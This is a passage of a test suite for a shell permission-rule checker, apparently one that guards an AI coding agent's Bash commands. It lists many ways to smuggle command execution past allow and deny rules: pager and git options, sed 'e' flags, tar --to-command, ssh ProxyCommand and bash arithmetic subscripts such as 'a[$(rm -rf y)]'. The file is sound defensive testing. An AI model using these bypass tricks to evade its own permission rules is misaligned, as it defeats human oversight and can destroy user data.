    "git --config-env=core.pager=X log",
    "git log -p --ext-diff",
    "mapfile -C 'rm x' -c 1 arr < f",
    "bind -x '\"\\C-x\":rm x'",
    "GIT_SSH_COMMAND='rm x' git fetch",
    "export PAGER='rm x'; git log",
    "sed -n '1e rm x' f",
    "sed 's/x/rm y/e' f",
    "rg --pre=rm x",
    "tar -tf a.tar --to-command=rm",
    "tar -tf a.tar --use-compress-program=rm",
    "tar -tIrm -f a.tar",
    "less +'!rm x' f",
    "man -P 'rm x' ls",
    "vim -c '!rm x'",
    "watch 'rm x'",
    "flock /tmp/l -c 'rm x'",
    "echo 'rm x' | at now",
    "crontab x",
    "find . -exec rm {} ;",
    "source ./env.sh",
    "env -S 'rm x'",
    "read 'a[$(rm x)]' < f",
    "read -r -a 'a[$(rm x)]' < f",
    "printf -v 'a[$(rm x)]' 1",
    "test -v 'a[$(rm x)]'",
    "[ -v 'a[$(rm x)]' ]",
    "wait -p 'a[$(rm x)]'",
    "getopts ab 'a[$(rm x)]'",
    "unset 'a[$(rm x)]'",
    "mapfile -t 'a[$(rm x)]' < f",
    "read \"$name\" < f",
    "sort --compress-program=rm f",
  ];

  it.each(HIDDEN)("deny Bash(rm *) asks for %j", (command) => {
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: ALLOW_EVERY_PROGRAM }))).toMatchObject({ decision: "ask", pattern: null });
  });

  it.each(HIDDEN)("no allow rule covers %j", (command) => {
    expect(evaluateShellRules(command, rules({ allow: ALLOW_EVERY_PROGRAM })).decision).toBeNull();
  });

  it.each(["unbuffer rm x", "eval rm x", "timeout 5 unbuffer rm -f x"])("deny sees through the wrapper in %j", (command) => {
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"] }))).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
  });

  it("refuses wrapper and interpreter prefixes it now hides", () => {
    expect(refusedShellPrefix(["unbuffer", "ls"])).toBe("wrapper");
    expect(refusedShellPrefix(["perl", "x.pl"])).toBe("interpreter");
  });
});

describe("security review: an allowed program's code-exec or write option asks", () => {
  it.each([
    ["Bash(sed -n *)", "sed -n '1e id' f"],
    ["Bash(sed -n *)", "sed -n 'w /tmp/pwn' f"],
    ["Bash(sed -n *)", "sed -n 's/a/b/w /tmp/pwn' f"],
    ["Bash(sed -n *)", "sed -n -f script.sed f"],
    ["Bash(sed -n *)", "sed -n -i 1p f"],
    ["Bash(sed *)", "sed -i.bak s/a/b/ f"],
    ["Bash(rg *)", "rg --pre=rm x"],
    ["Bash(rg *)", "rg --pre-glob '*' --pre rm x"],
    ["Bash(tar -tf *)", "tar -tf a.tar --to-command=rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar --use-compress-program=rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar -I rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar --checkpoint-action=exec=rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar -x"],
    ["Bash(less *)", "less +'!rm x' f"],
    ["Bash(less *)", "less -o log f"],
    ["Bash(git log *)", "git log -p --ext-diff"],
    ["Bash(git log *)", "git log --textconv -p"],
    ["Bash(git diff *)", "git diff --ext-diff"],
    ["Bash(git grep *)", "git grep -O'rm x' foo"],
    ["Bash(git fetch *)", "git fetch --upload-pack='rm x' origin"],
    ["Bash(git rebase *)", "git rebase -x 'rm x' main"],
    ["Bash(find *)", "find . -execdir rm {} ;"],
    ["Bash(find *)", "find . -fprintf out %p"],
    ["Bash(man *)", "man --pager='rm x' ls"],
    ["Bash(rsync *)", "rsync -e 'rm x' a b"],
    ["Bash(ssh *)", "ssh -o ProxyCommand='rm x' host"],
    ["Bash(fd *)", "fd -x rm"],
    ["Bash(xxd *)", "xxd in.bin out.hex"],
    ["Bash(xxd *)", "xxd -r -c 16 in.hex out.bin"],
  ])("%s does not allow %j", (allow, command) => {
    expect(evaluateShellRules(command, rules({ allow: [allow] })).decision).toBeNull();
  });

  it.each([
    ["Bash(read *)", "read -r line < f"],
    ["Bash(read *)", "read -r -p 'name? ' -a items < f"],
    ["Bash(printf *)", "printf -v out '%s' x"],
    ["Bash(test *)", "test -v HOME"],
    ["Bash(test *)", "test -v 'a[3]'"],
    ["Bash(unset *)", "unset a b"],
    ["Bash(mapfile *)", "mapfile -t lines < f"],
    ["Bash(sort *)", "sort -u f"],
    ["Bash(xxd *)", "xxd -c 16 in.bin"],
    ["Bash(git log *)", "git log --oneline"],
    ["Bash(git log *)", "git log -p --no-ext-diff -n 3"],
    ["Bash(git diff *)", "git diff HEAD~1 -- src"],
    ["Bash(rg *)", "rg foo src"],
    ["Bash(rg *)", "rg -n --glob '*.ts' foo"],
    ["Bash(sed -n *)", "sed -n 1,5p f"],
    ["Bash(sed -n *)", "sed -n '/start/,/end/p' f"],
    ["Bash(sed *)", "sed 's/a/b/g;s/c/d/' f"],
    ["Bash(sed *)", "sed -E -e 's/(a)/\\1/' f"],
    ["Bash(tar -tf *)", "tar -tf a.tar"],
    ["Bash(tar -tzf *)", "tar -tzf a.tgz"],
    ["Bash(less *)", "less +G f"],
    ["Bash(cat *)", "cat README.md"],
    ["Bash(npm run build)", "npm run build"],
    ["Bash(bun run build)", "bun run build"],
    ["Bash(find *)", "find . -name '*.ts'"],
    ["Bash(ls *)", "ls *"],
    ["Bash(ls *)", "ls -la src/*.ts"],
  ])("%s still allows %j", (allow, command) => {
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: [allow] })).decision).toBe("allow");
  });
});

describe("security review: arithmetic evaluation of a variable is hidden code", () => {
  // Bash arithmetic evaluates a variable's value as an expression; an array
  // subscript inside it runs command substitutions.
  it.each([
    "x='a[$(rm -rf y)]'; echo $((x))",
    "echo $((x+1))",
    "echo $((a[$(rm x)]))",
    "(( x > 1 ))",
    "let x=y+1",
    "[[ $x -eq 1 ]]",
    "[[ 1 -lt x ]]",
    "[[ \"$(cat n)\" -ge 2 ]]",
    "declare -i n=$y",
    "local -i q=$y",
    "echo ${a[$x]}",
    "echo ${s:$o:2}",
  ])("deny Bash(rm *) asks for %j", (command) => {
    const set = rules({ deny: ["Bash(rm *)"], allow: ["Bash(echo *)", "Bash(test *)", "Bash(let *)", "Bash(declare *)", "Bash(local *)"] });
    expect(evaluateShellRules(command, set)).toMatchObject({ decision: "ask", pattern: null });
    expect(evaluateShellRules(command, rules({ allow: ["Bash(echo *)", "Bash(test *)"] })).decision).toBeNull();
  });

  it.each([
    "echo $((1+2))",
    "echo $((10 * 2))",
    "[[ 1 -eq 1 ]]",
    "[[ a == b ]]",
    "echo ${a[1]}",
  ])("constant arithmetic stays visible: %j", (command) => {
    expect(analyzeShellForRules(command)).toMatchObject({ ok: true, hidden: [] });
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: ["Bash(echo *)", "Bash(test *)"] })).decision).toBe("allow");
  });
});
